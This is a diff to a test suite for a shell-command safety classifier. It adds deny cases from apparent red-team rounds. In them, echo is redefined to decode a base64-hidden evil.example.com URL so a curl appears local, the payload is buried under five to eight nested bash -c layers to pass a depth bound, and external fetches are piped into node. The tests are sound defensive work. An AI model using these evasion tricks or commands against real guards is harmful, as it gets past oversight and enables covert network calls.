@@ -296,6 +296,10 @@ describe('c8b1ccbf round 4', () => {
 // didi round 5 (card c8b1ccbf, on 897454ee6): item 1, a line that redefines echo / printf / cat makes
 // a "literal print" substitution run anything; items 2-3, an interpreter reached through a pipe kept
 // its stdin as data when an option took a value (-W ignore, -X utf8, node's -r) or xargs fed the code.
+// `bash -c '...'` nested n times, each level single-quoted the way a shell author writes it.
+const nestC = (body: string, n: number): string =>
+  n === 0 ? body : `bash -c '${nestC(body, n - 1).replace(/'/g, `'"'"'`)}'`
+
 describe('c8b1ccbf round 5', () => {
   const UL = 'cat <<E"O"F\nhi\nEOF\n'
   const B64 = 'aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g='
@@ -316,12 +320,18 @@ describe('c8b1ccbf round 5', () => {
     ['2 | node -r ./x.js', `cat <<'S' | node -r ./x.js\nfetch('${EXT}')\nS`],
     ['2 bash -c python3 -W ignore -', `bash -c 'python3 -W ignore -' <<'S'\n${PY}\nS`],
     ['3 | xargs -0 -I{} python3 -c {}', `cat <<'S' | xargs -0 -I{} python3 -c {}\n${PY}\nS`],
+    // Past classify's depth bound the body is judged as raw text (unreadableVerdict): the override
+    // is seen there only by the text's own check (5 levels), and behind a quote (6+ levels).
+    ['1 override at 5 nested bash -c', nestC(`echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`, 5)],
+    ['1 override at 6 nested bash -c (behind a quote)', nestC(`echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`, 6)],
+    ['1 override at 8 nested bash -c (behind a quote)', nestC(`echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`, 8)],
   ]
   it.each(deny)('denies %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true })
   })
   const pass: Array<[string, string]> = [
     ['echo of localhost, no definition', 'curl -s "$(echo localhost)/api/x"'],
+    ['echo of localhost at 6 nested bash -c, no definition', nestC('curl -s "$(echo localhost)/api/x"', 6)],
     ['printf of 127.0.0.1, no definition', 'curl -s "$(printf %s http://127.0.0.1:3420)/api/x"'],
     ['quoted cat heredoc of localhost', `curl -s "$(cat <<'S'\nlocalhost\nS\n)/api/x"`],
     ['a function that is not a printer, local curl', 'f(){ echo hi; }; f; curl -s http://localhost:3420/api/x'],
